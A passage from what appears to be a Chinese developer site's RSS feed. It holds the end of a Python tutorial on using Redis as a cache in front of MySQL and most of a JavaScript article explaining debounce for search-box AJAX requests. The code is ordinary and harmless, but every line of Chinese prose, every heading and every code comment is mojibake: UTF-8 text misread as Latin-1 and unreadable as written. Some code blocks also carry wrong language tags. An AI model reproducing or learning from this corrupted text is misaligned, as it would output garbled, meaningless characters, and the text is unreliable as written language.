        <span class="hljs-comment"># æœªè·å¾—é”ï¼ŒçŸ­æš‚ç­‰å¾…åé‡è¯•ï¼ˆæˆ–ç›´æ¥è¿”å›é”™è¯¯ï¼‰</span>
        time.sleep(<span class="hljs-number">0.01</span>)
        <span class="hljs-keyword">return</span> get_user_safe(user_id)  <span class="hljs-comment"># é€’å½’é‡è¯•ï¼ˆç”Ÿäº§ç¯å¢ƒå»ºè®®é™åˆ¶é‡è¯•æ¬¡æ•°ï¼‰</span>
</code></pre>
<hr/>
<h2 data-id="heading-8">âœ… ä¸‰ã€å®Œæ•´ä½¿ç”¨æµç¨‹ç¤ºä¾‹</h2>
<pre><code class="hljs language-ini" lang="ini">if <span class="hljs-attr">__name__</span> == <span class="hljs-string">"__main__"</span>:
    <span class="hljs-attr">user_id</span> = <span class="hljs-number">123</span>
    
    <span class="hljs-comment"># é¦–æ¬¡æŸ¥è¯¢ï¼šç¼“å­˜æœªå‘½ä¸­ â†’ æŸ¥ DB â†’ å†™ç¼“å­˜</span>
    <span class="hljs-attr">user</span> = get_user_by_id(user_id)
    print("User:", user)
    
    <span class="hljs-comment"># ç¬¬äºŒæ¬¡æŸ¥è¯¢ï¼šå‘½ä¸­ç¼“å­˜</span>
    <span class="hljs-attr">user</span> = get_user_by_id(user_id)
    print("User (cached):", user)
    
    <span class="hljs-comment"># æ›´æ–°ç”¨æˆ·</span>
    update_user(user_id, "New Name", "new@example.com")
    
    <span class="hljs-comment"># å†æ¬¡æŸ¥è¯¢ï¼šç¼“å­˜å·²å¤±æ•ˆï¼Œé‡æ–°åŠ è½½</span>
    <span class="hljs-attr">user</span> = get_user_by_id(user_id)
    print("Updated user:", user)
</code></pre>
<hr/>
<h2 data-id="heading-9">âœ… å››ã€é«˜çº§æŠ€å·§ä¸æ³¨æ„äº‹é¡¹</h2>
<h3 data-id="heading-10">1. <strong>ç¼“å­˜ç©ºå€¼é˜²ç©¿é€</strong></h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å¦‚ä¸Šæ–‡æ‰€ç¤ºï¼Œå¯¹ DB è¿”å› None çš„æƒ…å†µä¹Ÿç¼“å­˜ç©ºå­—ç¬¦ä¸²ï¼ˆTTL è¾ƒçŸ­ï¼‰</span>
</code></pre>
<h3 data-id="heading-11">2. <strong>è®¾ç½®éšæœºè¿‡æœŸæ—¶é—´é˜²é›ªå´©</strong></h3>
<pre><code class="hljs language-ini" lang="ini">import random
<span class="hljs-attr">base_ttl</span> = <span class="hljs-number">300</span>
<span class="hljs-attr">random_ttl</span> = base_ttl + random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">60</span>)  <span class="hljs-comment"># 300~360 ç§’</span>
redis_client.setex(key, random_ttl, value)
</code></pre>
<h3 data-id="heading-12">3. <strong>ä½¿ç”¨ Pipeline æ‰¹é‡æ“ä½œ</strong></h3>
<pre><code class="hljs language-scss" lang="scss">with redis_client<span class="hljs-selector-class">.pipeline</span>() as pipe:
    pipe.<span class="hljs-built_in">setex</span>(<span class="hljs-string">"user:1"</span>, <span class="hljs-number">300</span>, json.<span class="hljs-built_in">dumps</span>(user1))
    pipe.<span class="hljs-built_in">setex</span>(<span class="hljs-string">"user:2"</span>, <span class="hljs-number">300</span>, json.<span class="hljs-built_in">dumps</span>(user2))
    pipe.<span class="hljs-built_in">execute</span>()
</code></pre>
<h3 data-id="heading-13">4. <strong>ç›‘æ§ç¼“å­˜å‘½ä¸­ç‡</strong></h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># åœ¨ get_user ä¸­å¢åŠ æŒ‡æ ‡</span>
total_requests += <span class="hljs-number">1</span>
<span class="hljs-keyword">if</span> cached:
    cache_hits += <span class="hljs-number">1</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"Hit rate: <span class="hljs-subst">{cache_hits/total_requests:<span class="hljs-number">.2</span>%}</span>"</span>)
</code></pre>
<h3 data-id="heading-14">5. <strong>æ•°æ®ä¸€è‡´æ€§ä¿éšœ</strong></h3>
<ul>
<li><strong>æœ€ç»ˆä¸€è‡´æ€§</strong>ï¼šæ¥å—çŸ­æš‚ä¸ä¸€è‡´ï¼ˆé€‚ç”¨äºå¤§å¤šæ•°åœºæ™¯ï¼‰</li>
<li><strong>å¼ºä¸€è‡´æ€§</strong>ï¼šå†™æ“ä½œæ—¶åŠ å…¨å±€é”ï¼ˆæ€§èƒ½å·®ï¼Œæ…ç”¨ï¼‰</li>
<li><strong>å»¶è¿ŸåŒåˆ </strong>ï¼ˆä¸æ¨èï¼‰ï¼šå…ˆåˆ ç¼“å­˜ â†’ æ›´æ–° DB â†’ å»¶è¿Ÿå†åˆ ç¼“å­˜ï¼ˆä»æœ‰çª—å£æœŸï¼‰</li>
</ul>
<hr/>
<h2 data-id="heading-15">âœ… äº”ã€æ€»ç»“ï¼šæœ€ä½³å®è·µæ¸…å•</h2>









































<table><thead><tr><th>é¡¹ç›®</th><th>å»ºè®®</th></tr></thead><tbody><tr><td><strong>è¯»æµç¨‹</strong></td><td>å…ˆ Redisï¼Œå MySQL</td></tr><tr><td><strong>å†™æµç¨‹</strong></td><td>å…ˆ MySQLï¼Œååˆ  Redis</td></tr><tr><td><strong>ç¼“å­˜é”®è®¾è®¡</strong></td><td>è¯­ä¹‰æ¸…æ™°ï¼Œå¦‚ <code>user:{id}</code>ã€<code>product:{sku}</code></td></tr><tr><td><strong>ç©ºå€¼å¤„ç†</strong></td><td>ç¼“å­˜ç©ºç»“æœï¼ˆçŸ­ TTLï¼‰</td></tr><tr><td><strong>è¿‡æœŸæ—¶é—´</strong></td><td>è®¾ç½®éšæœºå€¼é˜²é›ªå´©</td></tr><tr><td><strong>çƒ­ç‚¹ Key</strong></td><td>ç”¨åˆ†å¸ƒå¼é”é˜²å‡»ç©¿</td></tr><tr><td><strong>åºåˆ—åŒ–</strong></td><td>ç”¨ JSONï¼ˆå…¼å®¹æ€§å¥½ï¼‰ï¼Œé¿å… pickleï¼ˆå®‰å…¨é£é™©ï¼‰</td></tr><tr><td><strong>è¿æ¥ç®¡ç†</strong></td><td>Redis ç”¨è¿æ¥æ± ï¼ŒMySQL ç”¨ä¸Šä¸‹æ–‡ç®¡ç†å™¨</td></tr></tbody></table>
<blockquote>
<p>ğŸ’¡ <strong>è®°ä½</strong>ï¼š<br/>
<strong>Redis æ˜¯åŠ é€Ÿå™¨ï¼Œä¸æ˜¯æ•°æ®åº“ã€‚æ‰€æœ‰å…³é”®æ•°æ®å¿…é¡»ä»¥ MySQL ä¸ºå‡†ã€‚</strong></p>
</blockquote>
<hr/>
<p>é€šè¿‡ä»¥ä¸ŠèŒƒä¾‹ï¼Œä½ å¯ä»¥å®‰å…¨ã€é«˜æ•ˆåœ°åœ¨ Python é¡¹ç›®ä¸­ç»“åˆ MySQL å’Œ Redisã€‚å¦‚æœéœ€è¦ <strong>Django / Flask é›†æˆç¤ºä¾‹</strong> æˆ– <strong>ä½¿ç”¨è¿æ¥æ± /å¼‚æ­¥ç‰ˆæœ¬ï¼ˆaioredisï¼‰</strong> ï¼Œæ¬¢è¿ç»§ç»­æé—®ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[é˜²æŠ–ï¼ˆDebounceï¼‰å®æˆ˜è§£æï¼šå¦‚ä½•ç”¨é—­åŒ…ä¼˜åŒ–é¢‘ç¹ AJAX è¯·æ±‚ï¼Œæå‡ç”¨æˆ·ä½“éªŒ]]></title>    <link>https://juejin.cn/post/7590054976489422888</link>    <guid>https://juejin.cn/post/7590054976489422888</guid>    <pubDate>2026-01-02T08:16:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590054976489422888" data-draft-id="7590104561475403828" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="é˜²æŠ–ï¼ˆDebounceï¼‰å®æˆ˜è§£æï¼šå¦‚ä½•ç”¨é—­åŒ…ä¼˜åŒ–é¢‘ç¹ AJAX è¯·æ±‚ï¼Œæå‡ç”¨æˆ·ä½“éªŒ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-02T08:16:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ— æ•Œçš„æ‹–æ‹‰æ–¯æ—‹é£"/> <meta itemprop="url" content="https://juejin.cn/user/951508170179208"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            é˜²æŠ–ï¼ˆDebounceï¼‰å®æˆ˜è§£æï¼šå¦‚ä½•ç”¨é—­åŒ…ä¼˜åŒ–é¢‘ç¹ AJAX è¯·æ±‚ï¼Œæå‡ç”¨æˆ·ä½“éªŒ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/951508170179208/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ— æ•Œçš„æ‹–æ‹‰æ–¯æ—‹é£
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T08:16:37.000Z" title="Fri Jan 02 2026 08:16:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ç°ä»£ Web å¼€å‘ä¸­ï¼Œç”¨æˆ·äº¤äº’è¶Šæ¥è¶Šä¸°å¯Œï¼Œä½†éšä¹‹è€Œæ¥çš„æ€§èƒ½é—®é¢˜ä¹Ÿæ—¥ç›Šçªå‡ºã€‚ä¸€ä¸ªå…¸å‹åœºæ™¯æ˜¯ï¼š<strong>æœç´¢æ¡†å®æ—¶å»ºè®®åŠŸèƒ½</strong>ã€‚å½“ç”¨æˆ·åœ¨è¾“å…¥æ¡†ä¸­å¿«é€Ÿæ‰“å­—æ—¶ï¼Œå¦‚æœæ¯æŒ‰ä¸€æ¬¡é”®å°±ç«‹å³å‘æœåŠ¡å™¨å‘é€ä¸€æ¬¡ AJAX è¯·æ±‚ï¼Œä¸ä»…ä¼šé€ æˆå¤§é‡æ— æ•ˆç½‘ç»œå¼€é”€ï¼Œè¿˜å¯èƒ½å¯¼è‡´é¡µé¢å¡é¡¿ã€å“åº”é”™ä¹±ï¼Œç”šè‡³å‹å®åç«¯æœåŠ¡ã€‚æœ¬æ–‡å°†ä»¥â€œç™¾åº¦æœç´¢å»ºè®®â€ä¸ºä¾‹ï¼Œé€šè¿‡å¯¹æ¯”<strong>æœªé˜²æŠ–</strong>ä¸<strong>é˜²æŠ–</strong>ä¸¤ç§å®ç°æ–¹å¼ï¼Œæ·±å…¥æµ…å‡ºåœ°è®²è§£é˜²æŠ–æŠ€æœ¯çš„åŸç†ã€å®ç°åŠå…¶å¸¦æ¥çš„æ˜¾è‘—ä¼˜åŠ¿ã€‚</p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€é—®é¢˜å¼•å…¥ï¼šä¸é˜²æŠ–çš„â€œè›®åŠ›è¯·æ±‚â€æœ‰å¤šç³Ÿç³•ï¼Ÿ</h2>
<p>å‡è®¾æˆ‘ä»¬æ­£åœ¨å¼€å‘ä¸€ä¸ªç±»ä¼¼ç™¾åº¦æœç´¢çš„è‡ªåŠ¨è¡¥å…¨åŠŸèƒ½ã€‚ç”¨æˆ·åœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥å…³é”®è¯ï¼Œå‰ç«¯å®æ—¶å°†å†…å®¹å‘é€åˆ°æœåŠ¡å™¨ï¼Œè·å–åŒ¹é…å»ºè®®å¹¶å±•ç¤ºã€‚</p>
<h3 data-id="heading-1">âŒ ä¸é˜²æŠ–çš„å®ç°ï¼ˆåé¢æ•™æï¼‰</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> input = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'search'</span>);
input.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'input'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) {
    <span class="hljs-title function_">ajax</span>(e.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>); <span class="hljs-comment">// æ¯æ¬¡è¾“å…¥éƒ½ç«‹åˆ»å‘è¯·æ±‚</span>
});

<span class="hljs-keyword">function</span> <span class="hljs-title function_">ajax</span>(<span class="hljs-params">query</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å‘é€è¯·æ±‚:'</span>, query);
    <span class="hljs-comment">// å®é™…é¡¹ç›®ä¸­è¿™é‡Œæ˜¯ fetch æˆ– XMLHttpRequest</span>
}
</code></pre>
<p><strong>ç”¨æˆ·è¾“å…¥ â€œjavascriptâ€ çš„è¿‡ç¨‹ï¼š</strong></p>
<p>è¡¨æ ¼</p>








































<table><thead><tr><th>è¾“å…¥æ­¥éª¤</th><th>è§¦å‘æ¬¡æ•°</th><th>å‘é€çš„è¯·æ±‚</th></tr></thead><tbody><tr><td>j</td><td>1</td><td>"j"</td></tr><tr><td>ja</td><td>2</td><td>"ja"</td></tr><tr><td>jav</td><td>3</td><td>"jav"</td></tr><tr><td>java</td><td>4</td><td>"java"</td></tr><tr><td>â€¦</td><td>â€¦</td><td>â€¦</td></tr><tr><td>javascript</td><td>10</td><td>"javascript"</td></tr></tbody></table>
<p><strong>åæœåˆ†æï¼š</strong></p>
<ul>
<li><strong>èµ„æºæµªè´¹</strong>ï¼šå‰9æ¬¡è¯·æ±‚å‡ ä¹æ— æ„ä¹‰ï¼ˆç”¨æˆ·è¿˜æ²¡è¾“å®Œï¼‰ï¼Œå´æ¶ˆè€—äº†å¸¦å®½ã€CPU å’ŒæœåŠ¡å™¨è¿æ¥ã€‚</li>
<li><strong>å“åº”é”™ä¹±</strong>ï¼šå¦‚æœâ€œjâ€çš„å“åº”æ¯”â€œjavascriptâ€æ™šåˆ°ï¼Œé¡µé¢ä¼šå…ˆæ˜¾ç¤ºâ€œjâ€çš„ç»“æœï¼Œå†è·³å˜åˆ°æœ€ç»ˆç»“æœï¼Œä½“éªŒæå·®ã€‚</li>
<li><strong>é¡µé¢å¡é¡¿</strong>ï¼šé«˜é¢‘ DOM æ“ä½œ + ç½‘ç»œå›è°ƒï¼Œå®¹æ˜“å¯¼è‡´ä¸»çº¿ç¨‹é˜»å¡ï¼Œè¾“å…¥æ¡†å˜å¾—â€œå¡æ‰‹â€ã€‚</li>
</ul>
<p>è¿™å°±æ˜¯å…¸å‹çš„â€œæ‰§è¡Œå¤ªå¯†é›†ã€ä»»åŠ¡å¤ªå¤æ‚â€é—®é¢˜â€”â€”<strong>äº‹ä»¶è§¦å‘é¢‘ç‡è¿œé«˜äºå®é™…éœ€æ±‚</strong>ã€‚</p>
<hr/>
<h2 data-id="heading-2">äºŒã€è§£å†³æ–¹æ¡ˆï¼šç”¨é˜²æŠ–ï¼ˆDebounceï¼‰ä¼˜é›…é™é¢‘</h2>
<h3 data-id="heading-3">âœ… ä»€ä¹ˆæ˜¯é˜²æŠ–ï¼Ÿ</h3>
<blockquote>
<p><strong>é˜²æŠ–ï¼ˆDebounceï¼‰</strong> Â æ˜¯ä¸€ç§å‡½æ•°ä¼˜åŒ–æŠ€æœ¯ï¼š<strong>åœ¨äº‹ä»¶è¢«é¢‘ç¹è§¦å‘æ—¶ï¼Œä»…åœ¨æœ€åä¸€æ¬¡è§¦å‘åç­‰å¾…æŒ‡å®šæ—¶é—´ï¼Œæ‰çœŸæ­£æ‰§è¡Œå‡½æ•°ã€‚</strong></p>
</blockquote>
<p>é€šä¿—ç†è§£ï¼š</p>
<blockquote>
<p>ç”¨æˆ·æ‰“å­—æ—¶ï¼Œæˆ‘ä¸æ€¥ç€æŸ¥ï¼›ç­‰ä»–<strong>åœæ‰‹500æ¯«ç§’</strong>ï¼Œæˆ‘æ‰è®¤ä¸ºä»–â€œæ‰“å®Œäº†â€ï¼Œè¿™æ—¶æ‰å‘è¯·æ±‚ã€‚</p>
</blockquote>
<h3 data-id="heading-4">ğŸ”§ é˜²æŠ–çš„æ ¸å¿ƒå®ç°ï¼ˆåŸºäºé—­åŒ…ï¼‰</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">debounce</span>(<span class="hljs-params">fn, delay</span>) {
    <span class="hljs-keyword">let</span> timer; <span class="hljs-comment">// é—­åŒ…å˜é‡ï¼šä¿å­˜å®šæ—¶å™¨ID</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">...args</span>) {
        <span class="hljs-keyword">const</span> context = <span class="hljs-variable language_">this</span>;
        <span class="hljs-built_in">clearTimeout</span>(timer); <span class="hljs-comment">// æ¸…é™¤ä¸Šä¸€æ¬¡çš„å®šæ—¶å™¨</span>
        timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
            fn.<span class="hljs-title function_">apply</span>(context, args); <span class="hljs-comment">// å»¶è¿Ÿæ‰§è¡Œï¼Œå¹¶ä¿æŒthiså’Œå‚æ•°</span>
        }, delay);
    };
}
</code></pre>
<p><strong>å…³é”®ç‚¹è§£æï¼š</strong></p>
<ul>
<li><strong>é—­åŒ…ä½œç”¨</strong>ï¼š<code>timer</code>Â è¢«å†…éƒ¨å‡½æ•°å¼•ç”¨ï¼Œä¸ä¼šè¢«åƒåœ¾å›æ”¶ï¼Œå¯è·¨å¤šæ¬¡è°ƒç”¨å…±äº«ã€‚</li>
<li><strong>æ¸…é™¤æ—§å®šæ—¶å™¨</strong>ï¼šæ¯æ¬¡è§¦å‘éƒ½é‡ç½®å€’è®¡æ—¶ï¼Œç¡®ä¿åªæ‰§è¡Œâ€œæœ€åä¸€æ¬¡â€ã€‚</li>
<li><strong>ä¿ç•™ä¸Šä¸‹æ–‡</strong>ï¼šé€šè¿‡Â <code>apply</code>Â ä¿è¯åŸå‡½æ•°çš„Â <code>this</code>Â å’Œå‚æ•°æ­£ç¡®ä¼ é€’ã€‚</li>
</ul>
<h3 data-id="heading-5">âœ… é˜²æŠ–åçš„ä½¿ç”¨</h3>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">debouncedAjax</span> = debounce(ajax, <span class="hljs-number">500</span>)<span class="hljs-comment">;</span>
input.addEventListener('input', function(e) {
    debouncedAjax(e.target.value)<span class="hljs-comment">;</span>
})<span class="hljs-comment">;</span>
</code></pre>
<p><strong>ç”¨æˆ·è¾“å…¥ â€œjavascriptâ€ çš„æ•ˆæœï¼š</strong></p>
<ul>
<li>å¿«é€Ÿæ‰“å®Œ10ä¸ªå­—æ¯ â†’Â <strong>åªè§¦å‘1æ¬¡è¯·æ±‚</strong>ï¼ˆâ€œjavascriptâ€ï¼‰</li>
<li>ä¸­é€”åœé¡¿è¶…è¿‡500ms â†’ è§¦å‘å½“å‰å€¼çš„è¯·æ±‚ï¼ˆå¦‚æ‰“åˆ°â€œjavaâ€åœä½ï¼‰</li>
</ul>
<hr/>
<h2 data-id="heading-6">ä¸‰ã€å¯¹æ¯”å®éªŒï¼šé˜²æŠ– vs ä¸é˜²æŠ–</h2>
<p>æˆ‘ä»¬åœ¨ HTML ä¸­æ”¾ç½®ä¸¤ä¸ªè¾“å…¥æ¡†ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">&lt;input <span class="hljs-attr">id</span>=<span class="hljs-string">"undebounce"</span> placeholder=<span class="hljs-string">"ä¸é˜²æŠ–ï¼ˆå±é™©ï¼ï¼‰"</span>&gt;
&lt;input <span class="hljs-attr">id</span>=<span class="hljs-string">"debounce"</span> placeholder=<span class="hljs-string">"é˜²æŠ–ï¼ˆæ¨èï¼‰"</span>&gt;
</code></pre>
<p>ç»‘å®šä¸åŒé€»è¾‘ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">// ä¸é˜²æŠ–ï¼šæ¯è¾“å…¥ä¸€ä¸ªå­—ç¬¦å°±è¯·æ±‚
undebounce.addEventListener('input', <span class="hljs-attr">e</span> =&gt; ajax(e.target.value))<span class="hljs-comment">;</span>

// é˜²æŠ–ï¼š500ms å†…åªæ‰§è¡Œæœ€åä¸€æ¬¡
debounce.addEventListener('input', <span class="hljs-attr">e</span> =&gt; debouncedAjax(e.target.value))<span class="hljs-comment">;</span>
</code></pre>
<p><strong>æ‰“å¼€æµè§ˆå™¨æ§åˆ¶å°ï¼Œåˆ†åˆ«å¿«é€Ÿè¾“å…¥ â€œreactâ€ï¼š</strong></p>
<ul>
<li><strong>ä¸é˜²æŠ–è¾“å…¥æ¡†</strong>ï¼šæ§åˆ¶å°ç¬é—´æ‰“å° 5 æ¡æ—¥å¿—ï¼ˆr, re, rea, reac, reactï¼‰</li>
<li><strong>é˜²æŠ–è¾“å…¥æ¡†</strong>ï¼šæ§åˆ¶å°ä»…åœ¨ä½ åœæ­¢è¾“å…¥å 0.5 ç§’æ‰“å° 1 æ¡æ—¥å¿—ï¼ˆreactï¼‰</li>
</ul>
<p><strong>ç”¨æˆ·ä½“éªŒå·®å¼‚ï¼š</strong></p>
<ul>
<li>ä¸é˜²æŠ–ï¼šé¡µé¢å¯èƒ½é—ªçƒã€å¡é¡¿ï¼Œå»ºè®®åˆ—è¡¨é¢‘ç¹è·³åŠ¨ã€‚</li>
<li>é˜²æŠ–ï¼šè¾“å…¥æµç•…ï¼Œç»“æœç¨³å®šï¼Œèµ„æºæ¶ˆè€—é™ä½ 80% ä»¥ä¸Šã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-7">å››ã€ä¸ºä»€ä¹ˆé˜²æŠ–èƒ½è§£å†³æ€§èƒ½é—®é¢˜ï¼Ÿ</h2>
<ol>
<li><strong>å‡å°‘æ— æ•ˆè¯·æ±‚</strong><br/>
ç”¨æˆ·è¾“å…¥è¿‡ç¨‹ä¸­äº§ç”Ÿçš„ä¸­é—´çŠ¶æ€ï¼ˆå¦‚â€œjâ€ã€â€œjaâ€ï¼‰é€šå¸¸æ— éœ€å¤„ç†ï¼Œé˜²æŠ–ç›´æ¥å¿½ç•¥å®ƒä»¬ã€‚</li>
<li><strong>é¿å…ç«æ€æ¡ä»¶ï¼ˆRace Conditionï¼‰</strong><br/>
åå‘çš„è¯·æ±‚è¦†ç›–å…ˆå‘çš„ç»“æœï¼Œç¡®ä¿ UI å§‹ç»ˆæ˜¾ç¤ºæœ€æ–°ã€æœ€å®Œæ•´çš„æŸ¥è¯¢ç»“æœã€‚</li>
<li><strong>é™ä½æœåŠ¡å™¨å‹åŠ›</strong><br/>
å‡è®¾æ¯å¤©æœ‰ 10 ä¸‡ç”¨æˆ·ä½¿ç”¨æœç´¢ï¼Œå¹³å‡æ¯äººè¾“å…¥ 10 æ¬¡ï¼Œä¸é˜²æŠ–äº§ç”Ÿ 100 ä¸‡è¯·æ±‚ï¼›é˜²æŠ–åå¯èƒ½ä»… 10 ä¸‡è¯·æ±‚ï¼ŒèŠ‚çœ 90% è®¡ç®—èµ„æºã€‚</li>
<li><strong>æå‡å‰ç«¯æ€§èƒ½</strong><br/>
å‡å°‘ JavaScript æ‰§è¡Œã€DOM æ›´æ–°å’Œç½‘ç»œå›è°ƒçš„é¢‘ç‡ï¼Œä¸»çº¿ç¨‹æ›´â€œè½»ç›ˆâ€ï¼Œé¡µé¢æ›´æµç•…ã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-8">äº”ã€é˜²æŠ–çš„é€‚ç”¨åœºæ™¯</h2>
<p>è¡¨æ ¼</p>

























